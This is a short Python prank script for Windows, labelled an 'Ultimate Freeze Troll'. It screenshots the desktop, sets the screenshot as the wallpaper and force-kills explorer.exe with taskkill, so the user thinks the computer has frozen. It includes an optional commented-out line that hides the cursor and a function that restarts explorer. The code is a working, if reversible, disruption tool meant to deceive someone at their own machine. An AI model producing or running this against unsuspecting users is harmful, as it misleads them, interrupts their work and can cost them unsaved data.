import ctypes, os, time, threading
from PIL import ImageGrab

def freeze_desktop():
    """
    The Ultimate 'Freeze' Troll:
    1. Takes a screenshot of the current desktop.
    2. Sets it as the wallpaper.
    3. Kills explorer.exe to hide the taskbar and desktop icons.
    4. The user thinks their PC is completely frozen while clicking on a static image.
    """
    def _freeze():
        try:
            # 1. Capture Desktop
            screenshot = ImageGrab.grab(all_screens=True)
            path = os.path.join(os.environ["TEMP"], "frozen.jpg")
            screenshot.save(path, "JPEG", quality=90)
            
            # 2. Set as Wallpaper
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            
            # 3. Kill Explorer
            os.system("taskkill /f /im explorer.exe")
            
            # Optional: Hide Cursor (extreme)
            # ctypes.windll.user32.ShowCursor(False)
            
        except Exception as e:
            print(f"[FREEZER] Error: {e}")

    threading.Thread(target=_freeze, daemon=True).start()

def unfreeze_desktop():
    """Restores the system by restarting explorer."""
    os.system("start explorer.exe")
